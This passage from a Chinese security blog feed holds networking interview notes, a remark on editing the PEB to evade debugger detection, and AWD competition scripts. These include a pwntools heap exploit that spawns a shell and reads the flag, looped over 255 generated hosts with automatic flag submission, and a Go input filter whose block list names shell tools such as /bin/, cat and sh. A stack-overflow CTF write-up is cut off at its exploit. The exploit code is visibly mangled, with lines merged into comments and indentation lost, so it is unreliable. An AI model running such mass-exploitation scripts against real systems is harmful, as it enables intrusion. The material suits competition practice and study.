        <content type="html"><![CDATA[<p>（面试必问）</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205818437.png" alt="image-20250317205818349"></p><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>进程是资源分配的基本单位，每个进程都有自己独立的一块内存空间，一个进程可以有多个线程。Windows操作系统描述进程的时候在系统地址空间用PEB结构体进行描述。逆向过程中可以通过修改PEB结构体的值来绕过调试器检测。</p><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>CPU调度的基本单位，一个进程至少有一个线程，一个进程可以运行多个线程，多个线程可共享进程的数据。每个线程有自己的程序计数器、虚拟机栈和本地方法栈。</p><p>线程是进程中最小的执行单位，同时也是计算机最小的调度单元。</p><h2 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h2><p>协程是一种特殊的函数，允许在执行过程中暂停和恢复，从而实现异步编程。与普通函数运行到结束为止不同，协程可以在执行过程中将控制权交还给调用方，使其他任务能够<a href="https://zhida.zhihu.com/search?content_id=710368169&content_type=Answer&match_order=1&q=%E5%B9%B6%E5%8F%91&zhida_source=entity">并发</a>运行。协程特别适合处理一些耗时操作（例如从网络获取数据或读取文件），这些操作通常会阻塞主线程。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【面试】HTTPS通信原理</title>
      <link href="/2025/03/17/%E3%80%90%E9%9D%A2%E8%AF%95%E3%80%91HTTPS%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/"/>
      <url>/2025/03/17/%E3%80%90%E9%9D%A2%E8%AF%95%E3%80%91HTTPS%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>HTTPS（HyperText Transfer Protocol Secure）是HTTP协议的安全版本，它通过结合使用TLS（Transport Layer Security）协议来加密HTTP通信。</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205654524.png" alt="image-20250317205654419"></p><h2 id="用户和网站通信的过程"><a href="#用户和网站通信的过程" class="headerlink" title="用户和网站通信的过程"></a>用户和网站通信的过程</h2><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205700130.png" alt="image-20250317205700022"></p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205705364.png" alt="image-20250317205705219"></p><h2 id="TLS四次握手"><a href="#TLS四次握手" class="headerlink" title="TLS四次握手"></a>TLS四次握手</h2><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205711644.png" alt="image-20250317205711504"></p><p>结合（SSH认证原理）</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【面试】UDP通信原理</title>
      <link href="/2025/03/17/%E3%80%90%E9%9D%A2%E8%AF%95%E3%80%91UDP%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/"/>
      <url>/2025/03/17/%E3%80%90%E9%9D%A2%E8%AF%95%E3%80%91UDP%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>UDP  属于传输层协议。UDP 协议的主要作用是将数据压缩成数据包的形式。</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205548870.png" alt="image-20250317205548833"></p><p>UDP 是一种无连接的协议，它提供简单的、不可靠的通信服务。</p><p>UDP 协议的通信较 TCP 简单了很多，减少了 TCP 的握手、确认、窗口、重传、拥塞控制等机制，UDP 是一个无状态的传输协议。</p><p>UDP 客户端在发送数据时并不判断主机是否可达，服务器是否开启等问题，同样它不能确定数据是否成功送达服务器。它只是将数据简单的封了一个包，之后就丢出去了。</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205553227.png" alt="image-20250317205553148"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【面试】TCP通信原理</title>
      <link href="/2025/03/17/%E3%80%90%E9%9D%A2%E8%AF%95%E3%80%91TCP%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/"/>
      <url>/2025/03/17/%E3%80%90%E9%9D%A2%E8%AF%95%E3%80%91TCP%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205345077.png" alt="image-20250317205345021"></p><p>TCP：TCP 是一种面向连接的协议，它提供可靠的、有序的、基于字节流的通信服务。TCP 通过三次握手建立连接，通过四次挥手关闭连接。（传输层，提供端到端的通信服务。）</p><h2 id="TCP三次握手校验"><a href="#TCP三次握手校验" class="headerlink" title="TCP三次握手校验"></a>TCP三次握手校验</h2><p>TCP 的<a href="https://zhida.zhihu.com/search?content_id=10518772&content_type=Article&match_order=1&q=%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B&zhida_source=entity">三次握手</a>，意思就是建立连接的时候客户端与服务器之间需要三次数据包的交流。</p><p>ACK：确认序号标志，为1时表示确认号有效，为0表示报文中不含确认信息，忽略确认号字段。</p><p>SYN：同步序号，用于建立连接过程</p><ol><li>客户端发送给服务器一个请求连接数据包，即发送了一个指向服务器目标端口的一个 SYN 位为 1 的TCP 报文。</li><li>服务器接收到客户端的连接请求之后，会回应一个 SYN 位为 1 的TCP 报文，表示同意连接。并且，会把 ACK 位也置 1 表示确认收到上次消息。</li><li>客户端接收到服务器的同意连接的数据包之后，还要回复一个 ACK 为 1 的 TCP 报文，表示确认收到。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205351274.png" alt="image-20250317205351223"></p><h2 id="TCP四次挥手断开连接"><a href="#TCP四次挥手断开连接" class="headerlink" title="TCP四次挥手断开连接"></a>TCP四次挥手断开连接</h2><p>TCP 的<a href="https://zhida.zhihu.com/search?content_id=10518772&content_type=Article&match_order=1&q=%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B&zhida_source=entity">四次挥手</a>，意思就是释放连接的时候客户端与服务器之间需要四次数据包的交流。</p><ol><li>客户端发送给服务器一个请求释放连接的数据包，即发送了一个指向服务器目标端口的一个 FIN 位为 1 的TCP 报文，表示客户端没有数据要发送了，但是仍然可以接收数据；并且 ACK 位也为 1，表示对上次传输数据结果的确认。并且之后处去等待状态，等待服务器的两次回应。</li><li>服务器接收到客户端的释放连接请求之后，会先回应一个 ACK 位为 1 的报文，表示确认收到。但是，这时服务器可能还有数据没有发送完成，继续发送数据。</li><li>服务器发送完数据之后，发送一个 FIN 为 1 的 TCP 报文，表示我也没有要发送的数据了，你可以释放连接了。当然 ACK 位仍然为 1 。</li><li>客户端接收到服务器的同意释放连接的数据包之后，回复一个 ACK 为 1 的 TCP 报文，表示确认收到。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250317205357557.png" alt="image-20250317205357506"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWD-Pwn脚本汇总</title>
      <link href="/2025/03/15/AWD-Pwn%E8%84%9A%E6%9C%AC%E6%B1%87%E6%80%BB/"/>
      <url>/2025/03/15/AWD-Pwn%E8%84%9A%E6%9C%AC%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<p>今天在整理语雀知识库的时候，整理之前参加awd的时候的脚本。</p><p>那时候pwn没咋学，总结一下：</p><p>（后面如果有机会还会在传）</p><h2 id="自动get-ip脚本"><a href="#自动get-ip脚本" class="headerlink" title="自动get ip脚本"></a>自动get ip脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">&#x27;url.txt&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">        url=<span class="string">&quot;127.0.&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;.1:9999\n&quot;</span></span><br><span class="line">        f.write(url)</span><br></pre></td></tr></table></figure><h2 id="自动攻击-提交"><a href="#自动攻击-提交" class="headerlink" title="自动攻击+提交"></a>自动攻击+提交</h2><p>pip install request</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#攻击函数，可以自定义</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">host,port</span>):</span><br><span class="line">    context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,timeout=<span class="number">30</span>)</span><br><span class="line">    <span class="comment"># context.log_level=&quot;DEBUG&quot;     p=remote(host,port)</span></span><br><span class="line"></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    elf=ELF(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p,&quot;b *0x400bd0&quot;)     newpost(p,&quot;AAAAAA&quot;)#0     newpost(p,&quot;BBBBBBB&quot;)#1     unsort(p,&quot;6666666&quot;) #2     newpost(p,&quot;hhhhh&quot;) #3 0x6020b8     #pause()     delete(p,&quot;2&quot;)</span></span><br><span class="line">    newpost(p,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    show(p)</span><br><span class="line">    libc.address=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>,timeout=<span class="number">3</span>)[-<span class="number">6</span>: ] + <span class="string">&#x27;\0\0&#x27;</span>)-  <span class="number">250</span>-<span class="number">0x3c4b10</span></span><br><span class="line">    success(<span class="string">&quot;libc -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(libc.address))</span><br><span class="line"></span><br><span class="line">    delete(p,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    delete(p,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    delete(p,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="comment"># pause()     newpost(p,p64(0x60208d))</span></span><br><span class="line">    <span class="comment"># pause() </span></span><br><span class="line">    newpost(p,<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()     newpost(p,&quot;&quot;)</span></span><br><span class="line">    ioaddr=<span class="number">0x7f55aab438e0</span>-<span class="number">0x7f55aa77f000</span></span><br><span class="line">    <span class="comment">####test # newpost(p,&quot;&quot;) # pause()     ####test     newpost(p,&#x27;qrstuvwxyz&#x27;+&quot;ABCDEFGHIJKLMNOPQ&quot;+p64(0x602018))</span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter the Index:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    content=p64(libc.address+<span class="number">283536</span>)[:-<span class="number">1</span>]</span><br><span class="line">    p.sendafter(<span class="string">&quot;Enter the Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#edit(&quot;4&quot;,&quot;/bin/sh&quot;)     #pause()     delete(p,&quot;6&quot;)</span></span><br><span class="line">    p.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">    flag=p.recvline()</span><br><span class="line">    p.close()<span class="comment">##！！！！！！！！！！！！！！！！！！！！！重要     return flag</span></span><br><span class="line">    <span class="comment">#################这些都不重要################################################### def newpost(p,content):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter the Content:&quot;</span>,content)</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">p,index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter the Index:&quot;</span>,index)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter the Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">p,index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter the Index:&quot;</span>,index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">p</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unsort</span>(<span class="params">p,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your Choice:&quot;</span>,<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Enter the Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#自动提交flag</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">flag, token</span>):</span><br><span class="line">    url = <span class="string">&quot;xxxx&quot;</span></span><br><span class="line">    pos = &#123;</span><br><span class="line">        <span class="string">&quot;flag&quot;</span>:flag,</span><br><span class="line">        <span class="string">&quot;token&quot;</span>:token</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Submiting flag : [%s]&quot;</span> % (pos)</span><br><span class="line">    response = requests.post(url,data=data)</span><br><span class="line">    content = response.content</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Content : %s &quot;</span> % (content)</span><br><span class="line">    <span class="keyword">if</span> failed <span class="keyword">in</span> content:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[-]failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[+] Success!&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">host,port</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="comment">#pwn是攻击函数</span></span><br><span class="line">flag = pwn(host,port)</span><br><span class="line"><span class="comment">#提交flag的submit函数</span></span><br><span class="line">submit(flag,token)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> m:</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit_it</span>():</span><br><span class="line"><span class="comment">#打开目标</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;url.txt&quot;</span>) <span class="keyword">as</span> f :</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line"><span class="comment">#分割ip和端口</span></span><br><span class="line">host = line.split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">port = <span class="built_in">int</span>(line.split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Exploiting:%s:%d&quot;</span> % (host,port))</span><br><span class="line"><span class="comment">#执行攻击脚本</span></span><br><span class="line">exploit(host,port)</span><br></pre></td></tr></table></figure><h2 id="pwnwaf-go语言版"><a href="#pwnwaf-go语言版" class="headerlink" title="pwnwaf-go语言版"></a>pwnwaf-go语言版</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;bufio&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span></span><br><span class="line">    <span class="string">&quot;regexp&quot;</span></span><br><span class="line">    <span class="string">&quot;strconv&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">//他大概的功能是匹配关键命令，替换为空，匹配flag文件，返回空内容。并将过程写入日志</span><br><span class="line">var wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line">const (</span><br><span class="line">    pwnPath = <span class="string">&quot;./tmp/nysec&quot;</span>  //替换为要保护的pwn</span><br><span class="line">    logPath = <span class="string">&quot;./tmp/pwnone_log/&quot;</span>  //替换为可读可写的 日志目录</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;该文件由Pwnwaf进行保护&quot;</span>)</span><br><span class="line">    _,err := os.Stat(logPath) //判断./tmp/nysec是否存在</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123; </span><br><span class="line">        //os.Mkdir(logPath, 0777) //如果文件夹不存在则创建文件夹</span><br><span class="line">        os.MkdirAll(logPath,0777)</span><br><span class="line">    &#125;</span><br><span class="line">    logfileName := time.Now().Format(<span class="string">&quot;15_04_05&quot;</span>) + <span class="string">&quot;_&quot;</span> + strconv.FormatInt(time.Now().UnixNano() / <span class="number">1e6</span>,<span class="number">10</span>) + <span class="string">&quot;.log&quot;</span></span><br><span class="line">    //time.Now().Format(<span class="string">&quot;15_04_05&quot;</span>)获取当前时间格式化当前时间</span><br><span class="line">    //strconv.FormatInt(time.Now().UnixNano() / <span class="number">1e6</span>,<span class="number">10</span>)：相当于随机数，这个数随着时间的推移而增大</span><br><span class="line">    logfileName = logPath + logfileName</span><br><span class="line">    f,err := os.OpenFile(logfileName,os.O_CREATE|os.O_WRONLY, os.ModePerm)</span><br><span class="line">    //创建为logfileName的文件</span><br><span class="line">    //os.O_CREATE|os.O_WRONLY：如果文件已存在，则会覆盖写，不会清空原来的文件，而是直接从头开始覆盖</span><br><span class="line">    fwriter := bufio.NewWriter(f) //创建默认大小的缓冲区</span><br><span class="line">    defer func() &#123; //匿名函数最后执行</span><br><span class="line">        fwriter.Flush() //将缓冲区文件写入到文件中</span><br><span class="line">        f.Close()</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    pwnCmd := <span class="built_in">exec</span>.Command(pwnPath) //运行nysec文件，即运行pwn文件</span><br><span class="line">    pwnIn,_ := pwnCmd.StdinPipe() //标准输入重定向到PwnIn</span><br><span class="line">    pwnOut,_ := pwnCmd.StdoutPipe()//标准输出重定向到PwnOut</span><br><span class="line">    pwnCmd.Start() //立即执行pwn文件</span><br><span class="line">    wg.Add(<span class="number">1</span>) </span><br><span class="line">    //一个 WaitGroup 对象可以等待一组协程结束</span><br><span class="line">    //wg.Add(<span class="built_in">int</span>) 设置协程的个数，然后创建worker协程</span><br><span class="line">    go func() &#123; //创建协程--output</span><br><span class="line">        dangerExp := regexp.MustCompile(<span class="string">&quot;flag\\&#123;.*?&#125;&quot;</span>) //正则匹配</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            output := make([]byte,<span class="number">1024</span>) //创建切片</span><br><span class="line">            length,err := pwnOut.Read(output)  //将pwnOut读入到output中</span><br><span class="line">            <span class="keyword">if</span> err != nil&#123;</span><br><span class="line">                wg.Done() //协程结束后都要调用 wg.Done()；</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            output = output[:length] //从第一个元素开始到output</span><br><span class="line">            fwriter.WriteString(<span class="string">&quot;send: \n&quot;</span>)</span><br><span class="line">            fwriter.Write(output)</span><br><span class="line">            fwriter.WriteString(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            fmt.Print(string(dangerExp.ReplaceAll(output,[]byte&#123;&#125;))) //将output中的某些特殊字符正则匹配为空</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    go func() &#123;//<span class="built_in">input</span></span><br><span class="line">        //创建正则表达式，匹配输入是否包含以下指令</span><br><span class="line">        dangerExp := regexp.MustCompile(<span class="string">&quot;/bin/|cat|flag|sh|tac|strings|head|tail|base64&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">input</span> := make([]byte,<span class="number">1024</span>)</span><br><span class="line">            length,err := os.Stdin.Read(<span class="built_in">input</span>) //读取输入</span><br><span class="line">            <span class="keyword">if</span> err != nil&#123;</span><br><span class="line">                wg.Done()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">input</span> = <span class="built_in">input</span>[:length]</span><br><span class="line">            //将获取的输入写入文件</span><br><span class="line">            fwriter.WriteString(<span class="string">&quot;receive: \n&quot;</span>)</span><br><span class="line">            fwriter.Write(<span class="built_in">input</span>)</span><br><span class="line">            fwriter.WriteString(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            //使用空白，替换 危险的关键字，使用正则表达式</span><br><span class="line">            <span class="built_in">input</span> = dangerExp.ReplaceAll(<span class="built_in">input</span>,[]byte&#123;&#125;)</span><br><span class="line">            //替换后的输入，写入pwnIn</span><br><span class="line">            _, err = pwnIn.Write(<span class="built_in">input</span>)</span><br><span class="line">            <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">                wg.Done() //协程结束后都要调用 wg.Done()；</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    wg.Wait() //main协程调用 wg.Wait() 阻塞等待所有协程执行完毕后返回</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Pwn1】栈溢出+覆盖判断条件练习题</title>
      <link href="/2025/03/15/%E3%80%90Pwn1%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%A6%86%E7%9B%96%E5%88%A4%E6%96%AD%E6%9D%A1%E4%BB%B6%E7%BB%83%E4%B9%A0%E9%A2%98/"/>
      <url>/2025/03/15/%E3%80%90Pwn1%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%A6%86%E7%9B%96%E5%88%A4%E6%96%AD%E6%9D%A1%E4%BB%B6%E7%BB%83%E4%B9%A0%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>题目：</p><p>通过网盘分享的文件：pwn1<br>链接: <a href="https://pan.baidu.com/s/1wbcX-sBng65_mNA0vrIKqQ?pwd=1234">https://pan.baidu.com/s/1wbcX-sBng65_mNA0vrIKqQ?pwd=1234</a> 提取码: 1234<br>（手机打开转存效果更佳）</p><p>知识点：栈溢出理解</p><p>先来复习一下，栈的结构和参数存储的位置</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142713291.png" alt="image-20250315142713100"></p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142722955.png" alt="image-20250315142722818"></p><p>把a1替换为0x61616161</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142727498.png" alt="image-20250315142727399"></p><p>gets() 函数不会限制用户输入的数据长度，而变量 s 的大小不是无限的</p><p>s输入的目的是替换 a1的值，将 a1 改写为 0x61616161，让if判断成立。</p><p>我们知道函数参数在栈中是在EIP（返回地址）的上面（地址的上面，高地址）</p><p>现在我们选择使用cyclic去预判（IDA有时候显示的不准确，汇编层面可以看s局部变量存储方式，如果是带有ebp寄存器参与可能显示不准确）</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142732202.png" alt="image-20250315142732088"></p><p>cyclic结合gdb的方式</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142737462.png" alt="image-20250315142737323"></p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142743303.png" alt="image-20250315142743209"></p><p>‘A’*28 + EBP值替换 + 返回地址(EIP) + 0x61616161</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span 